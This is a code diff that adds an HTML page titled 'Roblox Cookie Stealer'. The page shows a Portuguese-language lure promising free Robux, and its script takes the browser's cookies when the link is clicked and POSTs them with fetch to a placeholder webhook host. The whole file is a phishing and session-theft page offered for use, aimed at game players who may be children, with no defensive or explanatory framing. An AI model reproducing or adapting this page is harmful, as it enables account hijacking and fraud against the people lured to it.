@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Roblox Cookie Stealer</title>
+</head>
+<body>
+    <h1>Por favor, clique no link abaixo para reivindicar seu Robux grátis!</h1>
+    <a href="#" id="robuxLink">Clique aqui para reivindicar</a>
+
+    <script>
+        // Envia o cookie para o webhook
+        function sendCookieToWebhook(cookie) {
+            fetch('https://seuwebhook.com', {
+                method: 'POST',
+                body: JSON.stringify({ cookie: cookie }),
+                headers: {
+                    'Content-Type': 'application/json'
+                }
+            }).then(response => {
+                if (response.ok) {
+                    console.log('Cookie enviado com sucesso!');
+                } else {
+                    console.error('Erro ao enviar o cookie.');
+                }
+            }).catch(error => {
+                console.error('Erro ao enviar o cookie:', error);
+            });
+        }
+
+        // Obtém e envia o cookie quando o link for clicado
+        document.getElementById('robuxLink').addEventListener('click', function() {
+            var cookie = document.cookie;
+            sendCookieToWebhook(cookie);
+        });
+    </script>
+</body>
+</html>
